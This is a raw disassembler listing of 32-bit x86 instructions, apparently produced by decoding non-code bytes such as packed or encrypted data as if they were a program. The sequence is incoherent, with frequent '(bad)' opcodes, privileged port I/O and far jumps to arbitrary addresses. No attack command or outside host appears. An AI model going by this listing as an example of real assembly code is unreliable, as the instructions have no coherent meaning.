  40b0c7:	rol    BYTE PTR ds:0x4b02ed27,0x7b
  40b0ce:	or     cl,BYTE PTR [esi+0x798a154c]
  40b0d4:	mov    cs,WORD PTR [edx+esi*8-0x70dcd723]
  40b0db:	hlt    
  40b0dc:	std    
  40b0dd:	stos   DWORD PTR es:[edi],eax
  40b0de:	lea    esi,[esi+0x1d]
  40b0e1:	out    0x40,eax
  40b0e3:	adc    dl,cl
  40b0e5:	inc    esp
  40b0e6:	mov    edi,0x85f037c5
  40b0eb:	mov    al,BYTE PTR [ebp+eiz*4+0x6751723c]
  40b0f2:	bound  edx,QWORD PTR ds:0x84ee2ed0
  40b0f8:	or     al,BYTE PTR [esi-0x67]
  40b0fb:	ret    
  40b0fc:	retf   0x3fbf
  40b0ff:	test   al,0x6e
  40b101:	cdq    
  40b102:	(bad)  
  40b103:	arpl   bx,bx
  40b105:	call   0x3e9b8bf5
  40b10a:	cmp    ebp,DWORD PTR [edx]
  40b10c:	or     eax,0xd48c46e9
  40b111:	ret    0xd623
  40b114:	mov    ch,cl
  40b116:	sub    ecx,DWORD PTR [ebx-0x33]
  40b119:	mov    dl,0x5c
  40b11b:	pushf  
  40b11c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b11d:	xor    DWORD PTR [edx-0x1e],0xe4f6ed01
  40b124:	or     ecx,DWORD PTR [eax-0x3c]
  40b127:	inc    ebp
  40b128:	push   es
  40b129:	inc    ebp
  40b12a:	aam    0xdd
  40b12c:	xor    al,BYTE PTR [esi+0x28357774]
  40b132:	(bad)  
  40b133:	xchg   esi,eax
  40b134:	dec    edi
  40b135:	xchg   ebx,eax
  40b136:	js     0x40b0fa
  40b138:	or     BYTE PTR ds:0x4d0fc73,ch
  40b13e:	call   esp
  40b140:	shl    bl,1
  40b142:	or     al,BYTE PTR [edx+0x2a]
  40b145:	sbb    ah,BYTE PTR [edx-0x4719e2cb]
  40b14b:	inc    esp
  40b14c:	mov    bh,0xf3
  40b14e:	outs   dx,DWORD PTR ds:[esi]
  40b14f:	mov    ah,0xc1
  40b151:	mov    dl,BYTE PTR [ecx+eiz*4-0x3df826fb]
  40b158:	jne    0x40b117
  40b15a:	pushf  
  40b15b:	jmp    0x40b128
  40b15d:	add    eax,0xce5a0039
  40b162:	add    esi,ebx
  40b164:	sbb    BYTE PTR [eax+edx*1-0xa436337],bh
  40b16b:	nop
  40b16c:	jb     0x40b12a
  40b16e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b16f:	xor    bh,BYTE PTR [ebx+0x59a7697f]
  40b175:	popa   
  40b176:	imul   esi,ebp,0xd9c79e53
  40b17c:	mov    ch,0xab
  40b17e:	loop   0x40b17d
  40b180:	and    al,ch
  40b182:	dec    ecx
  40b183:	loope  0x40b121
  40b185:	in     al,0x49
  40b187:	enter  0x8639,0x85
  40b18b:	out    0x74,eax
  40b18d:	push   ss
  40b18e:	dec    esi
  40b18f:	mov    esi,0x2644ed3
  40b194:	ins    BYTE PTR es:[edi],dx
  40b195:	mov    ah,0x89
  40b197:	xchg   esi,eax
  40b198:	jne    0x40b1f5
  40b19a:	in     eax,0xdb
  40b19c:	xor    ebx,DWORD PTR [ecx-0x6ccea979]
  40b1a2:	(bad)  
  40b1a3:	adc    ch,dh
  40b1a5:	mov    BYTE PTR [ebp-0x26b9c4b3],dl
  40b1ab:	add    al,BYTE PTR [esi-0x44]
  40b1ae:	jg     0x40b198
  40b1b0:	or     DWORD PTR [edx+ebx*1+0x4d],esi
  40b1b4:	sub    esp,DWORD PTR [eax-0x34]
  40b1b7:	xor    BYTE PTR [eax],bl
  40b1b9:	jne    0x40b1a8
  40b1bb:	inc    eax
  40b1bc:	cmp    al,0xa8
  40b1be:	pop    ecx
  40b1bf:	(bad)  
  40b1c0:	and    BYTE PTR [ebx-0x59],dh
  40b1c3:	push   ds
  40b1c4:	push   ecx
  40b1c5:	iret   
  40b1c6:	aas    
  40b1c7:	test   eax,0x3c19b512
  40b1cc:	xor    eax,0x687467d5
  40b1d1:	shl    DWORD PTR ds:[ebx+0x44],1
  40b1d5:	rol    BYTE PTR [edi+0x2b],cl
  40b1d8:	sub    edx,DWORD PTR [ecx+0x7eaee1a3]
  40b1de:	add    edi,DWORD PTR [esi-0x778569b9]
  40b1e4:	dec    ecx
  40b1e5:	xchg   si,ax
  40b1e7:	xor    eax,0x5ffd053c
  40b1ec:	(bad)  [esi+0x7d]
  40b1ef:	fmul   DWORD PTR cs:[ecx+0x1a]
  40b1f3:	push   0xffffffc3
  40b1f5:	or     ah,bh
  40b1f7:	je     0x40b1db
  40b1f9:	pop    esp
  40b1fa:	mov    WORD PTR [edx],fs
  40b1fc:	push   ebp
  40b1fd:	or     esi,DWORD PTR [edi]
  40b1ff:	mov    al,BYTE PTR [eax]
  40b201:	cmp    al,0x45
  40b203:	in     eax,0x37
  40b205:	xchg   esp,eax
  40b206:	mov    edx,0xb154fe65
  40b20b:	pushf  
  40b20c:	sub    DWORD PTR [edi-0x25],ebp
  40b20f:	xor    al,0xda
  40b211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b212:	adc    dh,BYTE PTR [eiz*2-0x2901da6f]
  40b219:	sar    BYTE PTR [eax+eax*2-0x28e4d5ed],0x5f
  40b221:	lods   al,BYTE PTR ds:[esi]
  40b222:	mov    BYTE PTR [eax-0x3cf540be],0xde
  40b229:	sbb    eax,DWORD PTR [ecx]
  40b22b:	mov    al,ds:0x29ed983f
  40b230:	adc    edi,eax
  40b232:	pop    ebp
  40b233:	shr    DWORD PTR ds:0xbff00e8d,0xbe
  40b23a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b23b:	and    bl,BYTE PTR [edx+0x56c9815c]
  40b241:	dec    ebp
  40b242:	add    eax,ecx
  40b244:	inc    ecx
  40b245:	ja     0x40b2b0
  40b247:	sar    DWORD PTR [eax-0x5e13a80],1
  40b24d:	sub    DWORD PTR [ebp-0x7f],ecx
  40b250:	mov    al,ds:0xe1b94553
  40b255:	pop    ebp
  40b256:	pop    ds
  40b257:	arpl   dx,di
  40b259:	jnp    0x40b287
  40b25b:	pushf  
  40b25c:	aad    0xb2
  40b25e:	add    eax,0xb4cfc0f5
  40b263:	not    DWORD PTR [eax+0x2dc0cd7c]
  40b269:	add    eax,0x42ca15e
  40b26e:	out    0xb8,eax
  40b270:	cmp    dl,BYTE PTR [edi]
  40b272:	test   al,0x1e
  40b274:	imul   esp,DWORD PTR [edi+0x63958133],0xffffffe7
  40b27b:	jecxz  0x40b293
  40b27d:	add    DWORD PTR [esi-0x16],esp
  40b280:	pop    esp
  40b281:	jmp    0x40b29c
  40b283:	out    dx,eax
  40b284:	jb     0x40b29a
  40b286:	push   es
  40b287:	jo     0x40b284
  40b289:	sub    DWORD PTR [ebx],edx
  40b28b:	call   0xf9ebbf07
  40b290:	adc    al,0xf3
  40b292:	mov    al,dh
  40b294:	mov    eax,ds:0x8aa0787d
  40b299:	or     eax,0xbda30f6d
  40b29e:	sti    
  40b29f:	xor    BYTE PTR [esi+0x41f2cc1d],ch
  40b2a5:	pop    ebx
  40b2a6:	xor    BYTE PTR cs:[esi],0xd9
  40b2aa:	xchg   ebx,eax
  40b2ab:	add    al,0x12
  40b2ad:	sub    al,0xd1
  40b2af:	loop   0x40b247
  40b2b1:	lds    ecx,FWORD PTR [ecx+esi*4+0x33]
  40b2b5:	adc    ah,BYTE PTR ds:0xd804bb71
  40b2bb:	out    0xbc,al
  40b2bd:	adc    bl,cl
  40b2bf:	pushf  
  40b2c0:	ror    BYTE PTR [esi-0x6bfe0c4b],1
  40b2c6:	jno    0x40b2ff
  40b2c8:	rcr    DWORD PTR [eax-0x12fb1e46],cl
  40b2ce:	(bad)  
  40b2cf:	cmc    
  40b2d0:	aad    0x9d
  40b2d2:	sbb    DWORD PTR [edi],edi
  40b2d4:	jp     0x40b31b
  40b2d6:	pop    esi
  40b2d7:	in     eax,dx
  40b2d8:	stos   DWORD PTR es:[edi],eax
  40b2d9:	nop
  40b2da:	es ins DWORD PTR es:[edi],dx
  40b2dc:	nop
  40b2dd:	adc    al,0xf2
  40b2df:	bound  eax,QWORD PTR [edi+ebx*2+0x20]
  40b2e3:	mov    ebx,0xe7b17c21
  40b2e8:	cmp    BYTE PTR [ebp+0x38],bl
  40b2eb:	lods   eax,DWORD PTR ds:[esi]
  40b2ec:	sbb    DWORD PTR [ecx+0x6a31f582],ebp
  40b2f2:	pop    esp
  40b2f3:	jmp    0x40b284
  40b2f5:	xor    DWORD PTR [esi-0x9e20279],esp
  40b2fb:	pop    eax
  40b2fc:	jge    0x40b2e3
  40b2fe:	inc    ecx
  40b2ff:	rcl    ecx,cl
  40b301:	in     al,dx
  40b302:	sub    ecx,DWORD PTR [ebx+0x5e]
  40b305:	add    eax,0x7bf014dd
  40b30a:	jbe    0x40b2b8
  40b30c:	add    bl,ah
  40b30e:	scas   al,BYTE PTR es:[edi]
  40b30f:	push   ebp
  40b310:	in     al,0x44
  40b312:	int    0xa5
  40b314:	xchg   edx,eax
  40b315:	xor    BYTE PTR [edx+0x10],ah
  40b318:	jmp    0x40b30d
  40b31a:	adc    bh,BYTE PTR [esi+ecx*4]
  40b31d:	mov    edx,DWORD PTR [esp+ebp*2+0x265abdff]
  40b324:	inc    ecx
  40b325:	ficomp WORD PTR [eax]
  40b327:	xchg   ecx,eax
  40b328:	test   al,0x53
  40b32a:	out    dx,eax
  40b32b:	push   ebx
  40b32c:	mov    bl,0x11
  40b32e:	pusha  
  40b32f:	mov    dl,0x14
  40b331:	inc    ecx
  40b332:	mov    ebx,0x9ca3f193
  40b337:	test   eax,0xe06584c1
  40b33c:	fsub   DWORD PTR [edx+ebx*2-0x279e5c21]
  40b343:	test   al,0xb7
  40b345:	adc    cl,dh
  40b347:	mov    WORD PTR [esi+ecx*2-0x67],cs
  40b34b:	js     0x40b3b6
  40b34d:	add    eax,0x5d4b672d
  40b352:	(bad)  
  40b353:	mov    ecx,0xc031e4a0
  40b358:	mov    DWORD PTR [esi-0x6e6aaeaa],ebp
  40b35e:	aaa    
  40b35f:	xor    DWORD PTR [ebx-0x3a3542d1],ebp
  40b365:	fidiv  WORD PTR [edx+0x76e5ba94]
  40b36b:	lahf   
  40b36c:	cmp    DWORD PTR [ebx],0xffffff99
  40b36f:	fwait
  40b370:	loopne 0x40b38a
  40b372:	fs pushf 
  40b374:	jp     0x40b3b5
  40b376:	mov    ebp,0x6ef1945c
  40b37b:	push   es
  40b37c:	mov    al,ds:0x35c8bf06
  40b381:	pop    ecx
  40b382:	popa   
  40b383:	xor    eax,0x967658ff
  40b388:	out    dx,al
  40b389:	and    eax,0xdd814992
  40b38e:	outs   dx,DWORD PTR ds:[esi]
  40b38f:	adc    DWORD PTR [edx-0x10],edx
  40b392:	js     0x40b391
  40b394:	(bad)  
  40b395:	div    DWORD PTR [edi+0x4f]
  40b398:	in     al,0xb6
  40b39a:	pop    ecx
  40b39b:	pop    ds
  40b39c:	sbb    al,0x9c
  40b39f:	scas   eax,DWORD PTR es:[edi]
  40b3a0:	jne    0x40b3bf
  40b3a2:	call   0xeafa:0x948325ca
  40b3a9:	out    dx,eax
  40b3aa:	jb     0x40b421
  40b3ac:	mov    ds:0xd783d290,eax
  40b3b1:	push   edx
  40b3b2:	jb     0x40b37b
  40b3b4:	and    al,0x6a
  40b3b6:	push   edx
  40b3b7:	arpl   WORD PTR [eax-0xd],bp
  40b3ba:	retf   
  40b3bb:	dec    esp
  40b3bc:	dec    ebp
  40b3bd:	sbb    ch,al
  40b3bf:	(bad)  
  40b3c0:	adc    al,0xd9
  40b3c2:	pop    ebp
  40b3c3:	mov    edx,0xaa399311
  40b3c8:	dec    dh
  40b3ca:	mov    ebp,0x5cd4371d
  40b3cf:	cli    
  40b3d0:	in     eax,0xf
  40b3d2:	(bad)  
  40b3d4:	push   ecx
  40b3d5:	les    esi,FWORD PTR [ecx-0x42]
  40b3d8:	stos   DWORD PTR es:[edi],eax
  40b3d9:	out    0x4c,al
  40b3db:	retf   
  40b3dc:	add    eax,0xc1a68d67
  40b3e1:	lea    edx,[ebx-0x6b]
  40b3e4:	push   edi
  40b3e5:	aas    
  40b3e6:	cmp    DWORD PTR [edi-0x16fdde3b],ebp
  40b3ec:	push   0xffffffca
  40b3ee:	(bad)  
  40b3ef:	and    al,0xbc
  40b3f1:	mov    DWORD PTR [ecx+ecx*2-0x27],edx
  40b3f5:	dec    edi
  40b3f6:	loopne 0x40b444
  40b3f8:	push   0xffffffdc
  40b3fa:	neg    edx
  40b3fc:	mov    dl,0x92
  40b3fe:	bound  esp,QWORD PTR [esi]
  40b400:	das    
  40b401:	outs   dx,BYTE PTR ds:[esi]
  40b402:	add    eax,0xe1c6e7cd
  40b407:	repz int 0x43
  40b40a:	xor    eax,DWORD PTR [eax]
  40b40c:	sbb    BYTE PTR [ebp-0x7730882e],0x68
  40b413:	mov    dh,0xf7
  40b415:	pop    ds
  40b416:	sub    BYTE PTR [ecx-0x7e],bh
  40b419:	cmp    BYTE PTR [eax-0x5c],ch
  40b41c:	or     ah,BYTE PTR [ecx+0x64]
  40b41f:	mov    esp,0xcad134d9
  40b424:	mov    cl,BYTE PTR [edi]
  40b426:	in     eax,dx
  40b427:	jae    0x40b400
  40b429:	push   ecx
  40b42a:	dec    esi
  40b42b:	sub    ebp,DWORD PTR [edi-0x40]
  40b42e:	(bad)  
  40b430:	call   0x20fb:0xa03ea2bf
  40b437:	out    0x27,al
  40b439:	mov    bh,BYTE PTR [ebx-0x64041ec7]
  40b43f:	adc    BYTE PTR [eax],cl
  40b441:	and    edx,DWORD PTR ds:0x17ff97cc
  40b447:	ret    
  40b448:	sbb    bh,BYTE PTR [ecx]
  40b44a:	ds ins BYTE PTR es:[edi],dx
  40b44c:	push   0xffffffd9
  40b44e:	lods   eax,DWORD PTR ds:[esi]
  40b44f:	es cdq 
  40b451:	les    ecx,FWORD PTR [ebp+0x37]
  40b454:	jmp    0x536f98c9
  40b459:	or     DWORD PTR [esi],ebx
  40b45b:	test   eax,0x3f7d6015
  40b460:	push   ss
  40b461:	or     edi,esp
  40b463:	dec    eax
  40b464:	lahf   
  40b465:	jo     0x40b448
  40b467:	in     al,0xdc
  40b469:	jae    0x40b44e
  40b46b:	daa    
  40b46c:	in     al,dx
  40b46d:	pop    ss
  40b46e:	out    0xa7,eax
  40b470:	mov    bl,0xb2
  40b472:	stc    
  40b473:	fdivr  QWORD PTR fs:[ebx-0x200eca5d]
  40b47a:	sahf   
  40b47b:	stc    
  40b47c:	out    dx,eax
  40b47d:	aam    0x41
  40b47f:	test   al,0xdb
  40b481:	adc    BYTE PTR [ebx+0x2a],bl
  40b484:	pushf  
  40b485:	mov    al,ds:0x86aeb94c
  40b48a:	jnp    0x40b4a3
  40b48c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b48d:	and    al,0x88
  40b48f:	fs push edi
  40b491:	out    dx,al
  40b492:	and    esi,DWORD PTR [edi-0x72]
  40b495:	xchg   bl,al
  40b497:	push   eax
  40b498:	cmp    eax,edi
  40b49a:	mov    ebp,0x9004e22c
  40b49f:	lods   eax,DWORD PTR ds:[esi]
  40b4a0:	mov    cs,WORD PTR [ebx]
  40b4a2:	cmp    esp,DWORD PTR [ecx]
  40b4a4:	adc    DWORD PTR [ebx-0x594e610e],edi
  40b4aa:	je     0x40b477
  40b4ac:	pop    ebp
  40b4ad:	sti    
  40b4ae:	and    bl,BYTE PTR [edx-0x7]
  40b4b1:	aaa    
  40b4b2:	ror    DWORD PTR [ebp-0x59],1
  40b4b5:	dec    dl
  40b4b7:	inc    esi
  40b4b8:	cs pop esp
  40b4ba:	push   ebx
  40b4bb:	sub    BYTE PTR [ebp+0x46],0x8
  40b4bf:	fnstsw WORD PTR [eax-0x71091c41]
  40b4c5:	mov    edi,0x3e9af62
  40b4ca:	test   BYTE PTR [edx+0x448853ca],al
  40b4d0:	cld    
  40b4d1:	mov    cl,0x96
  40b4d3:	fdivr  QWORD PTR [ebx]
  40b4d5:	dec    esi
  40b4d6:	stos   BYTE PTR es:[edi],al
  40b4d7:	cmp    al,0x3f
  40b4d9:	(bad)  
  40b4da:	mov    es,edx
  40b4dc:	imul   edx,esp,0xffffffc1
  40b4df:	retf   0xde64
  40b4e2:	cmp    ch,dh
  40b4e4:	push   ebp
  40b4e5:	jo     0x40b49c
  40b4e7:	cmp    ecx,DWORD PTR [ebx+0x2625736a]
  40b4ed:	pop    ecx
  40b4ee:	push   0x42
  40b4f0:	imul   BYTE PTR [ecx+0x17929057]
  40b4f6:	push   edx
  40b4f7:	adc    al,0xd4
  40b4f9:	arpl   cx,sp
  40b4fb:	dec    ecx
  40b4fc:	ret    0x40a5
  40b4ff:	sbb    al,0x12
  40b501:	ja     0x40b4f9
  40b503:	jbe    0x40b4fb
  40b505:	or     bl,BYTE PTR [eax+0x25]
  40b508:	add    dl,BYTE PTR [ebx]
  40b50a:	gs push 0xffffffb5
  40b50d:	mov    WORD PTR [edx-0x6b],ss
  40b510:	mov    DWORD PTR [ebx],0x28a0be6b
  40b516:	sub    edx,edi
  40b518:	dec    eax
  40b519:	mov    ecx,0xc10da41f
  40b51e:	retf   
  40b51f:	test   BYTE PTR [ecx],ah
  40b521:	daa    
  40b522:	cmp    DWORD PTR [edx],edx
  40b524:	leave  
  40b525:	cli    
  40b526:	adc    BYTE PTR [eax-0x44],cl
  40b529:	or     eax,0x71809d9c
  40b52e:	cdq    
  40b52f:	scas   eax,DWORD PTR es:[edi]
  40b530:	sahf   
  40b531:	lds    ebx,FWORD PTR [esi+0x407d0a84]
  40b537:	mov    WORD PTR [edx-0x6e],fs
  40b53a:	sbb    esp,DWORD PTR [edi]
  40b53c:	push   edx
  40b53d:	or     BYTE PTR ds:[esi+0xe],al
  40b541:	out    dx,al
  40b542:	leave  
  40b543:	and    DWORD PTR [eax],0xc
  40b546:	mov    ch,0x18
  40b548:	aaa    
  40b549:	mov    edi,0x665ea904
  40b54e:	and    ecx,DWORD PTR [ebx]
  40b550:	xchg   ecx,eax
  40b551:	xor    dl,BYTE PTR [ebx]
  40b553:	mov    ?,WORD PTR [ebp+0x322a4d48]
  40b559:	sahf   
  40b55a:	cmp    al,0x62
  40b55c:	pop    ebx
  40b55d:	fstp   QWORD PTR [ebx]
  40b55f:	inc    edx
  40b560:	out    dx,eax
  40b561:	nop
  40b562:	add    eax,0x38b7ad0f
  40b567:	dec    eax
  40b568:	dec    ebx
  40b569:	pop    esp
  40b56a:	xchg   edi,eax
  40b56b:	ins    BYTE PTR es:[edi],dx
  40b56c:	(bad)  
  40b56d:	sbb    eax,0xbe24fa44
  40b572:	jnp    0x40b5ac
  40b574:	es repz inc edx
  40b577:	aam    0xde
  40b579:	and    BYTE PTR [ebx+0x2f],dh
  40b57c:	xchg   ebp,eax
  40b57d:	xchg   ebx,eax
  40b57e:	pop    eax
  40b57f:	jmp    0x95f39c9b
  40b584:	mov    ecx,DWORD PTR [ecx+0xa7e0866]
  40b58a:	scas   al,BYTE PTR es:[edi]
  40b58b:	and    bh,dl
  40b58d:	(bad)  
  40b58e:	out    dx,al
  40b58f:	push   ebp
  40b590:	jnp    0x40b5be
  40b592:	out    dx,eax
  40b593:	xchg   ecx,eax
  40b594:	push   esp
  40b595:	(bad)  [ebx-0x24]
  40b598:	pushf  
  40b599:	aaa    
  40b59a:	jl     0x40b558
  40b59c:	xor    eax,0xc1e12f28
  40b5a1:	push   ebp
  40b5a2:	popa   
  40b5a3:	sahf   
  40b5a4:	dec    ecx
  40b5a5:	in     eax,0x21
  40b5a7:	or     al,0xf1
  40b5a9:	push   0xfffffff5
  40b5ab:	mov    bl,0xf
  40b5ad:	adc    edi,ebx
  40b5af:	int    0x6d
  40b5b1:	pop    ebx
  40b5b2:	fcmovnb st,st(3)
  40b5b4:	(bad)  
  40b5b6:	shr    BYTE PTR [edi-0x41],cl
  40b5b9:	or     al,0xdd
  40b5bb:	mov    bh,0x66
  40b5bd:	xor    dh,cl
  40b5bf:	xor    DWORD PTR ds:0x3989a151,ebp
  40b5c5:	loope  0x40b63e
  40b5c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5c8:	mov    al,ds:0x67bb91a
  40b5cd:	xchg   ebp,eax
  40b5ce:	pusha  
  40b5cf:	mov    bh,BYTE PTR [eax+eiz*2]
  40b5d2:	xor    BYTE PTR [ebp-0x40884c65],ch
  40b5d8:	push   ecx
  40b5d9:	push   cs
  40b5da:	adc    edx,0xffffff8e
  40b5dd:	xchg   esp,eax
  40b5de:	dec    ecx
  40b5df:	and    DWORD PTR [edi-0x7001a413],ebp
  40b5e5:	addr16 aas 
  40b5e7:	or     edx,DWORD PTR [ebx]
  40b5e9:	das    
  40b5ea:	jae    0x40b641
  40b5ec:	outs   dx,DWORD PTR ds:[esi]
  40b5ed:	fnstsw WORD PTR [esi+0x1f]
  40b5f0:	lods   al,BYTE PTR ds:[esi]
  40b5f1:	fdivp  st(3),st
  40b5f3:	dec    ebx
  40b5f4:	xchg   ebp,eax
  40b5f5:	cdq    
  40b5f6:	add    ebx,DWORD PTR [edx-0x1c9ce61e]
  40b5fc:	ss std 
  40b5fe:	pop    ebp
  40b5ff:	and    esp,ebp
  40b601:	call   0x1231:0x5a6af4ec
  40b608:	jae    0x40b615
  40b60a:	call   0xa48d:0x1476d77
  40b611:	addr16 cs (bad) 
  40b614:	cmp    eax,0xb01a278
  40b619:	sbb    al,0xa8
  40b61b:	sbb    ecx,edx
  40b61d:	arpl   WORD PTR [ecx+0x78b1cfc1],si
  40b623:	out    0x72,al
  40b625:	(bad)  
  40b627:	stc    
  40b628:	sub    esi,esp
  40b62a:	shl    BYTE PTR [eax+0x25],0x2
  40b62e:	out    dx,eax
  40b62f:	jne    0x40b612
  40b631:	shl    bl,0x40
  40b634:	jnp    0x40b647
  40b636:	ss loop 0x40b67e
  40b639:	stc    
  40b63a:	ss repz mov al,0xa4
  40b63e:	cwde   
  40b63f:	dec    esp
  40b640:	mov    es,WORD PTR [esi+0x21]
  40b643:	test   dl,cl
  40b645:	xchg   edi,eax
  40b646:	xchg   esi,eax
  40b647:	xor    eax,0x98824211
  40b64c:	push   ss
  40b64d:	pop    ss
  40b64e:	mov    al,ds:0x5f050455
  40b653:	mov    ebp,0x7ea19164
  40b658:	dec    ebx
  40b659:	leave  
  40b65a:	scas   al,BYTE PTR es:[edi]
  40b65b:	adc    DWORD PTR [ebx],ebx
  40b65d:	sbb    BYTE PTR [edi+0x5],al
  40b660:	out    dx,al
  40b661:	rol    dh,0x13
  40b664:	jmp    0x40b644
  40b666:	cmp    ebp,ebx
  40b668:	and    DWORD PTR [esi+esi*1-0x61a0d205],eax
  40b66f:	push   ds
  40b670:	enter  0x6f49,0xc8
  40b674:	xchg   esp,eax
  40b675:	and    eax,0x1dfc31d2
  40b67a:	das    
  40b67b:	xor    bh,dh
  40b67d:	jmp    0xef63:0xa2170f0a
  40b684:	push   ebp
  40b685:	mov    ch,0x22
  40b687:	mov    bh,0xf9
  40b689:	pop    esi
  40b68a:	fmul   DWORD PTR [edi-0x6f]
  40b68d:	push   edi
  40b68e:	jmp    0xa641:0xe5a4a37f
  40b695:	int    0x43
  40b697:	stos   DWORD PTR es:[edi],eax
  40b698:	test   BYTE PTR [edx],bl
  40b69a:	xor    bh,BYTE PTR [edi]
  40b69c:	loop   0x40b657
  40b69e:	mov    esp,DWORD PTR [ebx+0x4392613]
  40b6a4:	push   cs
  40b6a5:	pop    esp
  40b6a6:	(bad)  
  40b6a7:	test   DWORD PTR [ecx+0x66],0x4b1601c8
  40b6ae:	dec    esi
  40b6af:	and    BYTE PTR [esi],ah
  40b6b1:	and    dh,BYTE PTR [edi-0x5317c78d]
  40b6b7:	fiadd  WORD PTR [ecx]
  40b6b9:	and    DWORD PTR [edi+ecx*2+0x53b2444f],esp
  40b6c0:	mov    al,ds:0xd2496a7a
  40b6c5:	fisubr WORD PTR [edi]
  40b6c7:	(bad)  [esi+0x43f63495]
  40b6cd:	mov    WORD PTR [edx+0x34],es
  40b6d0:	mov    ch,0x72
  40b6d2:	and    esp,esi
  40b6d4:	adc    BYTE PTR [ebx-0x60],ch
  40b6d7:	test   al,0xfb
  40b6d9:	inc    ebx
  40b6da:	pop    ebx
  40b6db:	mov    ss,WORD PTR [esi-0x4f]
  40b6de:	mov    ch,0xf5
  40b6e0:	pmullw mm7,QWORD PTR [esi+eax*4]
  40b6e4:	xchg   ebx,eax
  40b6e5:	push   edx
  40b6e6:	mov    ds:0xd138fbc2,eax
  40b6eb:	or     ebx,DWORD PTR [esp+edx*4]
  40b6ee:	cwde   
  40b6ef:	sbb    cl,BYTE PTR [ebx-0x4c549a37]
  40b6f5:	push   ebx
  40b6f6:	and    dh,BYTE PTR [eax]
  40b6f8:	and    ebx,eax
  40b6fa:	dec    esi
  40b6fb:	cmp    DWORD PTR [edx],ecx
  40b6fd:	or     ecx,DWORD PTR [ecx-0x6a87195b]
  40b703:	xor    eax,0xf28f7e79
  40b708:	rcr    BYTE PTR [edi+0x19],0xaa
  40b70c:	sub    dh,BYTE PTR [ebp-0x74]
  40b70f:	pop    esp
  40b710:	hlt    
  40b711:	cmp    edi,DWORD PTR [eax]
  40b713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b714:	xchg   ecx,eax
  40b715:	push   ebx
  40b716:	inc    eax
  40b717:	cmp    ebp,ebx
  40b719:	dec    eax
  40b71a:	xlat   BYTE PTR ds:[ebx]
  40b71b:	js     0x40b766
  40b71d:	stc    
  40b71e:	mov    cl,0xe0
  40b720:	xchg   DWORD PTR [esi+esi*4],esp
  40b723:	sti    
  40b724:	sub    DWORD PTR [ebp+0x35],esp
  40b727:	jg     0x40b72d
  40b729:	ins    DWORD PTR es:[edi],dx
  40b72a:	push   ds
  40b72b:	cmp    DWORD PTR [ebp-0xd629150],0x6f955460
  40b735:	enter  0x25f6,0x2d
  40b739:	xchg   edx,eax
  40b73a:	jecxz  0x40b6f2
  40b73c:	add    eax,0x10b01878
  40b741:	pop    ebp
  40b742:	pop    ss
  40b743:	cmp    al,0xc0
  40b745:	inc    esp
  40b746:	and    edx,DWORD PTR [eax+0x69]
  40b749:	das    
  40b74a:	ss jns 0x40b73b
  40b74d:	jns    0x40b708
  40b74f:	jo     0x40b7c1
  40b751:	pop    edi
  40b752:	mov    edx,0x25ab5eca
  40b757:	pop    ebx
  40b758:	out    0x8b,eax
  40b75a:	leave  
  40b75b:	sub    edi,DWORD PTR [edi-0x73]
  40b75e:	mov    ah,0x79
  40b760:	test   al,0x2c
  40b762:	fbld   TBYTE PTR [ebx-0x1f]
  40b765:	mov    WORD PTR [edx+0x7457414a],gs
  40b76b:	std    
  40b76c:	fnstcw WORD PTR [ecx]
  40b76e:	cmp    ebx,DWORD PTR ds:0xf7c52657
  40b774:	mov    edi,0x5f199fc8
  40b779:	test   DWORD PTR [edx+0x7b],0x531fe7dc
  40b780:	pop    ebp
  40b781:	jb     0x40b787
  40b783:	stos   DWORD PTR es:[edi],eax
  40b784:	xchg   BYTE PTR [esi+0x55a63a3a],dl
  40b78a:	mov    al,0x55
  40b78c:	sbb    ebx,DWORD PTR [esi-0x4d]
  40b78f:	je     0x40b741
  40b791:	cwde   
  40b792:	out    dx,eax
  40b793:	sub    dh,BYTE PTR [ebp-0x14]
  40b796:	lods   al,BYTE PTR ds:[esi]
  40b797:	mov    ch,0xc1
  40b799:	test   eax,0x38e7c52f
  40b79e:	ins    BYTE PTR es:[edi],dx
  40b79f:	pop    eax
  40b7a0:	gs out dx,al
  40b7a2:	sub    eax,0xa41de063
  40b7a7:	push   esp
  40b7a8:	pop    ebx
  40b7a9:	pop    ebx
  40b7aa:	mov    ebx,DWORD PTR [esi+0x6]
  40b7ad:	div    DWORD PTR [eax-0x20]
  40b7b0:	call   FWORD PTR [ecx+0x61]
  40b7b3:	into   
  40b7b4:	(bad)  
  40b7b5:	jecxz  0x40b773
  40b7b7:	xchg   edi,eax
  40b7b8:	pxor   mm7,QWORD PTR [ebp-0x41]
  40b7bc:	pop    ebp
  40b7bd:	adc    eax,0x97c18e5c
  40b7c2:	imul   edi,DWORD PTR [ebx+0x42],0x94723a1b
  40b7c9:	gs add al,ch
  40b7cc:	push   ss
  40b7cd:	ret    
  40b7ce:	sub    al,0x64
  40b7d0:	(bad)  
  40b7d1:	jo     0x40b76d
  40b7d3:	arpl   WORD PTR [eax+0x2e],bp
  40b7d6:	sti    
  40b7d7:	je     0x40b7b8
  40b7d9:	add    DWORD PTR [esi],esp
  40b7db:	adc    eax,eax
  40b7dd:	jmp    0x40b82e
  40b7df:	adc    al,0x71
  40b7e1:	mov    WORD PTR [eax],?
  40b7e3:	jbe    0x40b82d
  40b7e5:	sub    al,0x2d
  40b7e7:	fimul  DWORD PTR [edx+ebx*1-0x79]
  40b7eb:	cld    
  40b7ec:	sar    BYTE PTR [ecx+esi*4],0x3d
  40b7f0:	mov    edx,0x48b43662
  40b7f5:	xchg   BYTE PTR [ebp-0x23],al
  40b7f8:	push   0x83d17781
  40b7fd:	test   BYTE PTR [edx],0x2
  40b800:	jge    0x40b830
  40b802:	add    eax,0xc1cc0797
  40b807:	dec    ebp
  40b808:	xor    eax,0xb65f0078
  40b80d:	add    eax,DWORD PTR [ebp-0x4c]
  40b810:	adc    BYTE PTR ds:0xff087ccb,al
  40b816:	sub    edi,DWORD PTR [esi+0x7e8e2fed]
  40b81c:	adc    eax,0x3f313247
  40b821:	fwait
  40b822:	mov    eax,ebp
  40b824:	lea    edi,[ecx+ebp*1-0x2e33313b]
  40b82b:	inc    ebx
  40b82c:	push   ebx
